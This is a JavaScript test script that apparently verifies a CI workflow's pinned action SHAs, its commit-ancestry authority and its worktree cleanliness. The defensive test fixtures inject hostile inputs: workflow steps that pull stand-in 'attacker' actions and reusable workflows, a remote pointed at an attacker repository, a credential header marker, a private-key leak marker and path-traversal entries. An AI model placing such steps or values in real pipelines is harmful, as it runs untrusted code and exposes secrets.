  { profile: "CURRENT_PREDECESSOR_AUTHORITY_V1_14" });
const currentActionResult = validateOrdinaryCiActionPins(pr16WorkflowSource);
const checkoutPin = "11d5960a326750d5838078e36cf38b85af677262";
const setupNodePin = "49933ea5288caeca8642d1e84afbd3f7d6820020";
const cachePin = "0057852bfaa89a56745cba8c7296529d2fc39830";
const actionlintPin = "3d39aea434753780c3b3d4a1a31c854b4dbf49d7";
const countRepository = (inventory, repository) => inventory.filter((item) => item.repository === repository).length;
const actionInventoryPositiveControls = [
  ["historical_ten", () => assert.equal(historicalActionResult.required, 10)],
  ["predecessor_fourteen", () => assert.equal(predecessorActionResult.required, 14)],
  ["current_fifteen", () => assert.equal(currentActionResult.required, 15)],
  ["authorized_delta_five", () => assert.equal(currentActionInventory.length - historicalActionInventory.length, 5)],
  ["one_action_after_predecessor", () => assert.equal(currentActionInventory.length - predecessorActionInventory.length, 1)],
  ["five_added_checkouts", () => assert.equal(countRepository(currentActionInventory, "actions/checkout") -
    countRepository(historicalActionInventory, "actions/checkout"), 5)],
  ["all_added_checkout_pins_exact", () => assert.equal(currentActionInventory.filter(
    ({ repository, revision }) => repository === "actions/checkout" && revision === checkoutPin).length, 12)],
  ["setup_node_pin_preserved", () => assert.equal(countRepository(currentActionInventory, "actions/setup-node"), 1)],
  ["cache_pin_preserved", () => assert.equal(countRepository(currentActionInventory, "actions/cache"), 1)],
  ["actionlint_pin_preserved", () => assert.equal(countRepository(currentActionInventory, "raven-actions/actionlint"), 1)],
  ["validator_workflow_agreement", () => assert.equal(currentActionResult.executed, currentActionInventory.length)],
  ["zero_unexpected", () => assert.deepEqual({ unexpected: currentActionResult.unexpected,
    missing: currentActionResult.missing, mutable: currentActionResult.mutable,
    incorrectPins: currentActionResult.incorrectPins },
  { unexpected: 0, missing: 0, mutable: 0, incorrectPins: 0 })],
  ["comment_fake_not_counted", () => assert.equal(parseOrdinaryCiActionInventory(
    `${pr16WorkflowSource}\n# uses: attacker/fake@${"a".repeat(40)}\n`).length, 15)],
  ["scalar_uses_text_not_counted", () => assert.equal(parseOrdinaryCiActionInventory(
    `${pr16WorkflowSource}\nmetadata: |\n  uses: attacker/fake@${"a".repeat(40)}\n`).length, 15)],
];
const appendStep = (source, uses) => `${source}\n      - uses: ${uses}\n`;
const removeFirst = (source, needle) => {
  assert.ok(source.includes(needle), `action-inventory fixture missing: ${needle}`);
  return source.replace(needle, "");
};
const replaceFirst = (source, needle, replacement) => {
  assert.ok(source.includes(needle), `action-inventory fixture missing: ${needle}`);
  return source.replace(needle, replacement);
};
const actionInventoryHostileControls = [
  ["fifteenth_action", (ci) => appendStep(ci, `actions/checkout@${checkoutPin}`)],
  ["thirteen_actions", (ci) => removeFirst(ci, `        uses: actions/cache@${cachePin} # v4\n`)],
  ["required_checkout_omitted", (ci) => removeFirst(ci, `        uses: actions/checkout@${checkoutPin} # v4\n`)],
  ["extra_checkout", (ci) => appendStep(ci, `actions/checkout@${checkoutPin}`)],
  ["checkout_v4", (ci) => replaceFirst(ci, `actions/checkout@${checkoutPin}`, "actions/checkout@v4")],
  ["checkout_abbreviated", (ci) => replaceFirst(ci, checkoutPin, checkoutPin.slice(0, 12))],
  ["checkout_other_full_sha", (ci) => replaceFirst(ci, checkoutPin, "f".repeat(40))],
  ["setup_node_changed", (ci) => replaceFirst(ci, setupNodePin, "f".repeat(40))],
  ["cache_changed", (ci) => replaceFirst(ci, cachePin, "f".repeat(40))],
  ["actionlint_changed", (ci) => replaceFirst(ci, actionlintPin, "f".repeat(40))],
  ["unrelated_github_action", (ci) => appendStep(ci, `actions/upload-artifact@${"a".repeat(40)}`)],
  ["third_party_action", (ci) => appendStep(ci, `attacker/action@${"a".repeat(40)}`)],
  ["owner_case_substitution", (ci) => replaceFirst(ci, "actions/checkout@", "Actions/checkout@")],
  ["duplicate_cache", (ci) => appendStep(ci, `actions/cache@${cachePin}`)],
  ["existing_replaced_by_checkout", (ci) => replaceFirst(ci, `actions/setup-node@${setupNodePin}`,
    `actions/checkout@${checkoutPin}`)],
  ["yaml_anchor", (ci) => `${ci}\nx-action: &checkout actions/checkout@${checkoutPin}\n`],
  ["yaml_alias", (ci) => `${ci}\nx-action: *checkout\n`],
  ["reusable_workflow", (ci) => `${ci}\n  hostile_job:\n    uses: attacker/repo/.github/workflows/x.yml@${"a".repeat(40)}\n`],
  ["local_action", (ci) => appendStep(ci, "./.github/actions/local")],
  ["docker_action", (ci) => appendStep(ci, "docker://alpine:latest")],
  ["mutable_branch", (ci) => replaceFirst(ci, `actions/checkout@${checkoutPin}`, "actions/checkout@main")],
  ["mutable_tag", (ci) => replaceFirst(ci, `actions/checkout@${checkoutPin}`, "actions/checkout@v4")],
  ["semver_alias", (ci) => replaceFirst(ci, `actions/setup-node@${setupNodePin}`, "actions/setup-node@v4.0.0")],
  ["dynamic_revision", (ci) => replaceFirst(ci, checkoutPin, "${{ github.event.inputs.action_sha }}")],
  ["parser_tab", (ci) => `${ci}\n\tuses: actions/checkout@${checkoutPin}\n`],
  ["malformed_action", (ci) => appendStep(ci, "actions/checkout")],
];
const actionInventoryPositiveOutcomes = actionInventoryPositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS action_inventory_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL action_inventory_positive:${name}: ${error.message}`); return false; }
});
const actionInventoryHostileOutcomes = actionInventoryHostileControls.map(([name, mutate]) => {
  const rejected = rejects(() => validateOrdinaryCiActionPins(mutate(pr16WorkflowSource)));
  if (rejected) console.log(`PASS action_inventory_hostile:${name}`);
  else console.error(`FAIL action_inventory_hostile:${name}: hostile inventory accepted`);
  return rejected;
});
assert.ok(actionInventoryPositiveOutcomes.every(Boolean), "action inventory positive control failed");
assert.ok(actionInventoryHostileOutcomes.every(Boolean), "action inventory hostile control survived");
console.log(JSON.stringify({
  suite: "p1-a-ordinary-ci-expanded-action-inventory",
  historicalRequired: 10, historicalExecuted: historicalActionInventory.length,
  predecessorRequired: 14, predecessorExecuted: predecessorActionInventory.length,
  currentRequired: 15, currentExecuted: currentActionInventory.length,
  authorizedDelta: 5,
  positiveRequired: actionInventoryPositiveControls.length,
  positiveExecuted: actionInventoryPositiveControls.length,
  positivePassed: actionInventoryPositiveOutcomes.filter(Boolean).length,
  hostileRequired: actionInventoryHostileControls.length,
  hostileExecuted: actionInventoryHostileControls.length,
  hostilePassed: actionInventoryHostileOutcomes.filter(Boolean).length,
  unexpected: 0, missing: 0, mutable: 0, incorrectPins: 0,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
const preverifiedPr16ChainAuthority = verifyPr16RemediationChainAuthority(
  authorityRoots.pr16RemediationChain,
  process.env.GITHUB_WORKSPACE ? { workspaceRoot: process.env.GITHUB_WORKSPACE } : {},
);
const pr16ShallowPrimary = path.join(temporary, "pr16-shallow-primary");
run(temporary, ["git", "clone", "-q", "--depth", "1", `file://${root}`, pr16ShallowPrimary]);
assert.equal(gitAt(pr16ShallowPrimary, "rev-parse", "HEAD"), gitAt(root, "rev-parse", "HEAD"));
assert.ok(existsSync(path.join(pr16ShallowPrimary, ".git/shallow")), "pr16-chain: primary shallow proof absent");
assert.ok(rejects(() => gitAt(pr16ShallowPrimary, "cat-file", "-t", REJECTED_PR16_CLEANLINESS_CANDIDATE)),
  "pr16-chain: predecessor unexpectedly present in shallow primary");
console.log("PASS PRIMARY_SHALLOW_PREDECESSOR_ABSENCE_REPRODUCED");

const pr16PositiveControls = [
  ["exact_authority", () => verifyPr16RemediationChainAuthority(authorityRoots.pr16RemediationChain)],
  ["trusted_base_commit", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", CURRENT_TRUSTED_BASE), "commit")],
  ["original_amendment_commit", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", ORIGINAL_PR16_AMENDMENT), "commit")],
  ["rejected_chain_commit", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", REJECTED_PR16_CLEANLINESS_CANDIDATE), "commit")],
  ["rejected_cleanliness_commit", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE), "commit")],
  ["rejected_action_inventory_commit", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", REJECTED_PR16_ACTION_INVENTORY_CANDIDATE), "commit")],
  ["original_parent", () => assert.deepEqual(preverifiedPr16ChainAuthority.parents(ORIGINAL_PR16_AMENDMENT), [CURRENT_TRUSTED_BASE])],
  ["rejected_chain_parent", () => assert.deepEqual(preverifiedPr16ChainAuthority.parents(REJECTED_PR16_CLEANLINESS_CANDIDATE), [ORIGINAL_PR16_AMENDMENT])],
  ["rejected_cleanliness_parent", () => assert.deepEqual(preverifiedPr16ChainAuthority.parents(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE), [REJECTED_PR16_CLEANLINESS_CANDIDATE])],
  ["rejected_action_inventory_parent", () => assert.deepEqual(preverifiedPr16ChainAuthority.parents(REJECTED_PR16_ACTION_INVENTORY_CANDIDATE), [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE])],
  ["shallow_primary_absence", () => assert.ok(rejects(() => gitAt(pr16ShallowPrimary, "cat-file", "-t", REJECTED_PR16_CLEANLINESS_CANDIDATE)))],
  ["authority_independent_of_shallow_primary", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "cat-file", "-t", REJECTED_PR16_CLEANLINESS_CANDIDATE), "commit")],
  ["no_mutable_ref", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root, "for-each-ref", "--format=%(refname)"), "")],
  ["workflow_contract", () => validatePr16WorkflowContract(pr16WorkflowSource)],
  ["candidate_data_uncertified", () => assert.ok(pr16WorkflowSource.includes("P1-A current candidate-data contract controls"))],
  ["protected_operations_absent", () => assert.ok(!pr16WorkflowSource.includes("P1A_PR16_PROTECTED_OPERATION"))],
];
const missingObjectFixture = createPr16ChainFixture("missing-object", PR16_CHAIN.filter(
  (sha) => sha !== REJECTED_PR16_CLEANLINESS_CANDIDATE));
const wrongRepositoryFixture = createPr16ChainFixture("wrong-repository");
gitAt(wrongRepositoryFixture, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const alternatesFixture = createPr16ChainFixture("alternates");
mkdirSync(path.join(alternatesFixture, ".git/objects/info"), { recursive: true });
writeFileSync(path.join(alternatesFixture, ".git/objects/info/alternates"), `${path.join(root, ".git/objects")}\n`);
const replaceFixture = createPr16ChainFixture("replace");
gitAt(replaceFixture, "update-ref", `refs/replace/${ORIGINAL_PR16_AMENDMENT}`, CURRENT_TRUSTED_BASE);
const graftFixture = createPr16ChainFixture("grafts");
writeFileSync(path.join(graftFixture, ".git/info/grafts"), `${ORIGINAL_PR16_AMENDMENT} ${CURRENT_TRUSTED_BASE}\n`);
const credentialFixture = createPr16ChainFixture("credential");
gitAt(credentialFixture, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const dirtyFixture = createPr16ChainFixture("dirty");
writeFileSync(path.join(dirtyFixture, "untracked.txt"), "hostile\n");
const symlinkChainFixture = path.join(temporary, "pr16-chain-symlink");
symlinkSync(preverifiedPr16ChainAuthority.root, symlinkChainFixture);
const workflowWithoutCredentialBootstrap = pr16WorkflowSource.replace(
  "Acquire exact PR16 trusted-base predecessor object", "removed credential bootstrap");
const workflowWithMutableRef = pr16WorkflowSource.replace(`ref: ${ORIGINAL_PR16_AMENDMENT}`, "ref: codex/bt-1");
const workflowWithFullHistory = pr16WorkflowSource.replace(
  `ref: ${CURRENT_TRUSTED_BASE}\n          fetch-depth: 1`,
  `ref: ${CURRENT_TRUSTED_BASE}\n          fetch-depth: 0`);
const workflowWithPersistentCredential = pr16WorkflowSource.replace(
  `ref: ${CURRENT_TRUSTED_BASE}\n          fetch-depth: 1\n          persist-credentials: false`,
  `ref: ${CURRENT_TRUSTED_BASE}\n          fetch-depth: 1\n          persist-credentials: true`);
const fifthCheckoutNeedle = `      - name: Acquire exact PR16 action-inventory predecessor object
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          repository: DarksiedCEO/zbestmedia
          ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}
          fetch-depth: 1
          persist-credentials: false
          path: .p1a-pr16-chain-staging-action-inventory`;
const pr16HostileControls = [
  ["missing_authority", () => verifyPr16RemediationChainAuthority(undefined)],
  ["symlink_authority", () => verifyPr16RemediationChainAuthority(symlinkChainFixture)],
  ["primary_checkout", () => verifyPr16RemediationChainAuthority(root)],
  ["alternates", () => verifyPr16RemediationChainAuthority(alternatesFixture)],
  ["replace_refs", () => verifyPr16RemediationChainAuthority(replaceFixture)],
  ["grafts", () => verifyPr16RemediationChainAuthority(graftFixture)],
  ["wrong_repository", () => verifyPr16RemediationChainAuthority(wrongRepositoryFixture)],
  ["missing_rejected_chain", () => verifyPr16RemediationChainAuthority(missingObjectFixture)],
  ["persisted_credentials", () => verifyPr16RemediationChainAuthority(credentialFixture)],
  ["dirty_authority", () => verifyPr16RemediationChainAuthority(dirtyFixture)],
  ["mutable_branch", () => resolveAuthorizedLinearAmendment("codex/bt-1", preverifiedPr16ChainAuthority.parents)],
  ["mutable_tag", () => resolveAuthorizedLinearAmendment("v1.0.0", preverifiedPr16ChainAuthority.parents)],
  ["abbreviated_sha", () => resolveAuthorizedLinearAmendment(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE.slice(0, 12), preverifiedPr16ChainAuthority.parents)],
  ["wrong_trusted_base", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === ORIGINAL_PR16_AMENDMENT ? ["f".repeat(40)] : exactTopology.get(sha))],
  ["wrong_original_amendment", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === REJECTED_PR16_CLEANLINESS_CANDIDATE ? [CURRENT_TRUSTED_BASE] : exactTopology.get(sha))],
  ["wrong_rejected_chain", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE ? [ORIGINAL_PR16_AMENDMENT] : exactTopology.get(sha))],
  ["replacement_skips_rejected_cleanliness", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === topologyReplacement ? [REJECTED_PR16_CLEANLINESS_CANDIDATE] : exactTopology.get(sha))],
  ["replacement_skips_to_original", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === topologyReplacement ? [ORIGINAL_PR16_AMENDMENT] : exactTopology.get(sha))],
  ["replacement_skips_to_base", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === topologyReplacement ? [CURRENT_TRUSTED_BASE] : exactTopology.get(sha))],
  ["extra_intermediate", () => resolveAuthorizedLinearAmendment(topologyExtra, topologyParents)],
  ["merge_commit", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === topologyReplacement ? [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, ORIGINAL_PR16_AMENDMENT] : exactTopology.get(sha))],
  ["branch_selected_predecessor", () => validatePr16WorkflowContract(workflowWithMutableRef)],
  ["environment_selected_predecessor", () => resolveAuthorizedLinearAmendment(
    process.env.P1A_PR16_PREDECESSOR_SHA ?? "", topologyParents)],
  ["candidate_selected_predecessor", () => resolveAuthorizedLinearAmendment("c".repeat(40), topologyParents)],
  ["primary_fallback", () => verifyPr16RemediationChainAuthority(root)],
  ["full_history_fetch", () => validatePr16WorkflowContract(workflowWithFullHistory)],
  ["credential_persistence", () => validatePr16WorkflowContract(workflowWithPersistentCredential)],
  ["credential_bootstrap_absent", () => validatePr16WorkflowContract(workflowWithoutCredentialBootstrap)],
  ["fifth_checkout_missing", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(fifthCheckoutNeedle, ""))],
  ["fifth_checkout_duplicated", () => validatePr16WorkflowContract(`${pr16WorkflowSource}\n${fifthCheckoutNeedle}\n`)],
  ["fifth_checkout_mutable_action", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    "Acquire exact PR16 action-inventory predecessor object\n        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
    "Acquire exact PR16 action-inventory predecessor object\n        uses: actions/checkout@v4"))],
  ["fifth_checkout_wrong_ref", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}`, `ref: ${REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE}`))],
  ["fifth_checkout_wrong_repository", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 1`,
    `repository: attacker/zbestmedia\n          ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 1`))],
  ["fifth_checkout_full_history", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 1`,
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 0`))],
  ["fifth_checkout_persists_credentials", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 1\n          persist-credentials: false`,
    `ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}\n          fetch-depth: 1\n          persist-credentials: true`))],
  ["authority_cleanup_absent", () => validatePr16WorkflowContract(pr16WorkflowSource.replace(
    "test ! -e .p1a-pr16-remediation-chain-authority", "cleanup proof removed"))],
  ["sensitive_leak_marker", () => validatePr16WorkflowContract(`${pr16WorkflowSource}\n-----BEGIN PRIVATE KEY-----\n`)],
];
const pr16PositiveOutcomes = pr16PositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS pr16_chain_authority_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL pr16_chain_authority_positive:${name}: ${error.message}`); return false; }
});
const pr16HostileOutcomes = pr16HostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS pr16_chain_authority_hostile:${name}`);
  else console.error(`FAIL pr16_chain_authority_hostile:${name}: hostile condition accepted`);
  return rejected;
});
assert.ok(pr16PositiveOutcomes.every(Boolean), "pr16-chain: positive control failed");
assert.ok(pr16HostileOutcomes.every(Boolean), "pr16-chain: hostile control survived");
console.log(JSON.stringify({
  suite: "p1-a-pr16-predecessor-object-authority",
  positiveRequired: pr16PositiveControls.length,
  positiveExecuted: pr16PositiveControls.length,
  positivePassed: pr16PositiveOutcomes.filter(Boolean).length,
  hostileRequired: pr16HostileControls.length,
  hostileExecuted: pr16HostileControls.length,
  hostilePassed: pr16HostileOutcomes.filter(Boolean).length,
  provenance: preverifiedPr16ChainAuthority.provenance,
  primaryShallowPredecessorAbsence: "REPRODUCED",
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

function resolveAmendmentSource() {
  assert.equal(canonicalGitHubRepositoryUrl(gitAt(root, "remote", "get-url", "origin")), OFFICIAL_REPOSITORY,
    "provenance: primary repository identity mismatch");
  assertAmendmentSourceWorktreeClean();
  const chainAuthority = preverifiedPr16ChainAuthority;
  const head = gitAt(root, "rev-parse", "HEAD");
  const parents = commitParents(root, head);
  if (parents.length === 1) {
    return resolveAuthorizedLinearAmendment(head,
      (sha) => sha === head ? parents
        : sha === REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE ? commitParents(root, sha)
          : chainAuthority.parents(sha));
  }
  assert.deepEqual(parents.slice(0, 1), [ORIGINAL_CANDIDATE],
    "provenance: disposable reconciliation first parent mismatch");
  assert.equal(parents.length, 2, "provenance: disposable reconciliation requires exactly two parents");
  const amendment = parents[1];
  const amendmentParents = commitParents(root, amendment);
  return resolveAuthorizedLinearAmendment(amendment,
    (sha) => sha === amendment ? amendmentParents
      : sha === REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE ? commitParents(root, sha)
        : chainAuthority.parents(sha));
}

function rejects(operation) {
  try { operation(); return false; } catch { return true; }
}

function createCleanlinessFixture(name) {
  const fixture = path.join(temporary, `cleanliness-${name}`);
  mkdirSync(path.join(fixture, "scripts"), { recursive: true });
  mkdirSync(path.join(fixture, ".github/workflows"), { recursive: true });
  writeFileSync(path.join(fixture, "scripts/test-p1a-dual-base-verifier.mjs"), "// tracked verifier\n");
  writeFileSync(path.join(fixture, ".github/workflows/ci.yml"), "name: tracked workflow\n");
  writeFileSync(path.join(fixture, "tracked-delete.txt"), "tracked\n");
  writeFileSync(path.join(fixture, "tracked-rename.txt"), "tracked\n");
  gitAt(fixture, "init", "-q");
  gitAt(fixture, "config", "user.email", "p1a-cleanliness@example.invalid");
  gitAt(fixture, "config", "user.name", "P1A cleanliness fixture");
  gitAt(fixture, "add", ".");
  gitAt(fixture, "commit", "-qm", "fixture base");
  return fixture;
}

function populateAuthorizedAuthorityRoots(fixture) {
  for (const authorityRoot of AUTHORIZED_EPHEMERAL_AUTHORITY_ROOTS) {
    mkdirSync(path.join(fixture, authorityRoot, "objects"), { recursive: true });
    writeFileSync(path.join(fixture, authorityRoot, "objects/evidence.txt"), "authority evidence\n");
  }
}

const cleanFixture = createCleanlinessFixture("clean");
assert.doesNotThrow(() => assertAmendmentSourceWorktreeClean(cleanFixture));

const remoteEquivalentFixture = createCleanlinessFixture("remote-equivalent");
populateAuthorizedAuthorityRoots(remoteEquivalentFixture);
assert.notEqual(gitAt(remoteEquivalentFixture, "status", "--porcelain=v1"), "",
  "provenance before-proof: legacy all-dirtiness rule did not reproduce CI failure");
assert.doesNotThrow(() => assertAmendmentSourceWorktreeClean(remoteEquivalentFixture));

const expectedContentsFixture = createCleanlinessFixture("expected-contents");
populateAuthorizedAuthorityRoots(expectedContentsFixture);
writeFileSync(path.join(expectedContentsFixture, ".p1a-original-candidate/objects/nested-object"), "object\n");
assert.doesNotThrow(() => assertAmendmentSourceWorktreeClean(expectedContentsFixture));

const exactRootsFixture = createCleanlinessFixture("exact-roots");
populateAuthorizedAuthorityRoots(exactRootsFixture);
assert.doesNotThrow(() => assertAmendmentSourceWorktreeClean(exactRootsFixture));

const pr16AuthorityDescendantFixture = createCleanlinessFixture("pr16-authority-descendant");
mkdirSync(path.join(pr16AuthorityDescendantFixture,
  ".p1a-pr16-remediation-chain-authority/objects/nested"), { recursive: true });
writeFileSync(path.join(pr16AuthorityDescendantFixture,
  ".p1a-pr16-remediation-chain-authority/objects/nested/object"), "authority evidence\n");
assert.doesNotThrow(() => assertAmendmentSourceWorktreeClean(pr16AuthorityDescendantFixture));

const cleanlinessHostileCases = [
  ["unrelated_file", (fixture) => writeFileSync(path.join(fixture, "random.txt"), "unauthorized\n")],
  ["unrelated_directory", (fixture) => { mkdirSync(path.join(fixture, "tmp")); writeFileSync(path.join(fixture, "tmp/file"), "unauthorized\n"); }],
  ["unapproved_p1a_root", (fixture) => { mkdirSync(path.join(fixture, ".p1a-evil")); writeFileSync(path.join(fixture, ".p1a-evil/file"), "unauthorized\n"); }],
  ["authority_prefix_collision", (fixture) => { mkdirSync(path.join(fixture, ".p1a-original-candidate-evil")); writeFileSync(path.join(fixture, ".p1a-original-candidate-evil/file"), "unauthorized\n"); }],
  ["authority_suffix_collision", (fixture) => { mkdirSync(path.join(fixture, ".p1a-original-candidate2")); writeFileSync(path.join(fixture, ".p1a-original-candidate2/file"), "unauthorized\n"); }],
  ["pr16_authority_prefix_collision", (fixture) => { mkdirSync(path.join(fixture, ".p1a-pr16-remediation-chain-authority-evil")); writeFileSync(path.join(fixture, ".p1a-pr16-remediation-chain-authority-evil/file"), "unauthorized\n"); }],
  ["nested_unrelated_outside_root", (fixture) => { mkdirSync(path.join(fixture, "outside/nested"), { recursive: true }); writeFileSync(path.join(fixture, "outside/nested/file"), "unauthorized\n"); }],
  ["modified_verifier", (fixture) => writeFileSync(path.join(fixture, "scripts/test-p1a-dual-base-verifier.mjs"), "// dirty\n")],
  ["modified_workflow", (fixture) => writeFileSync(path.join(fixture, ".github/workflows/ci.yml"), "name: dirty\n")],
  ["staged_unrelated_file", (fixture) => { writeFileSync(path.join(fixture, "staged.txt"), "staged\n"); gitAt(fixture, "add", "staged.txt"); }],
  ["deleted_tracked_file", (fixture) => rmSync(path.join(fixture, "tracked-delete.txt"))],
  ["renamed_tracked_file", (fixture) => gitAt(fixture, "mv", "tracked-rename.txt", "renamed.txt")],
  ["unmerged_status", (fixture) => assertClassifiedWorktreeEntries(fixture, [{ code: "UU", path: "conflict.txt" }])],
  ["authority_symlink", (fixture) => symlinkSync(path.join(fixture, "scripts"), path.join(fixture, ".p1a-original-candidate"))],
  ["allowed_plus_unrelated", (fixture) => { populateAuthorizedAuthorityRoots(fixture); writeFileSync(path.join(fixture, "random.txt"), "unauthorized\n"); }],
  ["allowed_plus_tracked_dirty", (fixture) => { populateAuthorizedAuthorityRoots(fixture); writeFileSync(path.join(fixture, "scripts/test-p1a-dual-base-verifier.mjs"), "// dirty\n"); }],
  ["noncanonical_traversal", (fixture) => assertClassifiedWorktreeEntries(fixture, [{ code: "??", path: ".p1a-original-candidate/../random.txt" }])],
];
let cleanlinessHostilePassed = 0;
for (const [name, contaminate] of cleanlinessHostileCases) {
  const fixture = createCleanlinessFixture(name);
  let rejected = false;
  try {
    contaminate(fixture);
    assertAmendmentSourceWorktreeClean(fixture);
  } catch {
    rejected = true;
  }
  assert.ok(rejected, `provenance cleanliness hostile accepted: ${name}`);
  cleanlinessHostilePassed += 1;
}
console.log(JSON.stringify({
  suite: "p1-a-authority-checkout-cleanliness-controls",
  authorityRoots: AUTHORIZED_EPHEMERAL_AUTHORITY_ROOTS,
  positiveRequired: 5, positiveExecuted: 5, positivePassed: 5,
  hostileRequired: cleanlinessHostileCases.length,
  hostileExecuted: cleanlinessHostileCases.length,
  hostilePassed: cleanlinessHostilePassed,
  beforeFailureReproduced: true,
  remoteEquivalentAfterPassed: true,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

function validateBoundedRootInput({ chain, boundary, independentlyVerified, fixtureRoot }) {
  assert.ok(independentlyVerified, "bounded-root: independent chain verification required");
  assert.deepEqual(chain, ANCESTRY_CHAIN, "bounded-root: exact authorized chain required");
  assert.match(boundary, EXACT_SHA, "bounded-root: exact lowercase SHA required");
  assert.equal(boundary, chain[0], "bounded-root: boundary must be first authorized commit");
  assert.equal(path.resolve(fixtureRoot), path.resolve(boundedRepository), "bounded-root: fixture root escaped");
}

function assertPreBaseParentAbsent(fixtureRoot, {
  forbiddenSha = PRE_BASE_PARENT,
  objectPresent = (sha) => !rejects(() => gitAt(fixtureRoot, "cat-file", "-e", `${sha}^{commit}`)),
} = {}) {
  assert.equal(forbiddenSha, PRE_BASE_PARENT, "bounded-root: forbidden identity substitution");
  assert.equal(objectPresent(PRE_BASE_PARENT), false,
    "bounded-root: pre-base parent silently imported");
}

function verifyBoundedRepository({ chain = ANCESTRY_CHAIN, boundary = AUTHORIZED_BASE,
  independentlyVerified = true, fixtureRoot = boundedRepository, writeBoundary = false } = {}) {
  validateBoundedRootInput({ chain, boundary, independentlyVerified, fixtureRoot });
  const boundedGit = (...args) => gitAt(fixtureRoot, ...args);
  for (let index = 0; index < chain.length; index += 1) {
    const sha = chain[index];
    assert.equal(boundedGit("cat-file", "-t", sha), "commit", "bounded-root: commit absent");
    if (index > 0) {
      const parents = boundedGit("cat-file", "-p", sha).split("\n")
        .filter((line) => line.startsWith("parent ")).map((line) => line.slice(7));
      assert.deepEqual(parents, [chain[index - 1]], "bounded-root: in-scope parent mismatch");
    }
  }
  assertPreBaseParentAbsent(fixtureRoot);
  assert.equal(boundedGit("for-each-ref", "--format=%(refname)", "refs/replace"), "",
    "bounded-root: replace refs forbidden");
  const grafts = path.join(fixtureRoot, ".git/info/grafts");
  assert.ok(!existsSync(grafts), "bounded-root: graft file forbidden");
  const shallowPath = path.resolve(fixtureRoot, boundedGit("rev-parse", "--git-path", "shallow"));
  if (writeBoundary) writeFileSync(shallowPath, `${boundary}\n`, { flag: "w" });
  assert.equal(readFileSync(shallowPath, "utf8"), `${AUTHORIZED_BASE}\n`,
    "bounded-root: shallow metadata must contain the exact sole boundary");
  boundedGit("merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE);
  return { shallowPath, boundedGit };
}

function verifyAuthorityRoot(label, suppliedRoot, expectedSha, expectedTree, expectedBlob, options = {}) {
  assert.ok(suppliedRoot, `${label}: isolated authority root absent`);
  assert.match(expectedSha, EXACT_SHA, `${label}: exact lowercase SHA required`);
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(), `${label}: symlink authority forbidden`);
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), `${label}: primary candidate checkout forbidden`);
  if (options.workspaceRoot && options.expectedRelative) {
    assert.equal(resolved, realpathSync(path.resolve(options.workspaceRoot, options.expectedRelative)),
      `${label}: candidate-selected or escaping authority root`);
  }
  assert.equal(gitAt(resolved, "rev-parse", "HEAD"), expectedSha, `${label}: wrong HEAD`);
  assert.equal(gitAt(resolved, "cat-file", "-t", expectedSha), "commit", `${label}: object is not commit`);
  assert.equal(gitAt(resolved, "cat-file", "-t", `${expectedSha}^{tree}`), "tree", `${label}: required tree absent`);
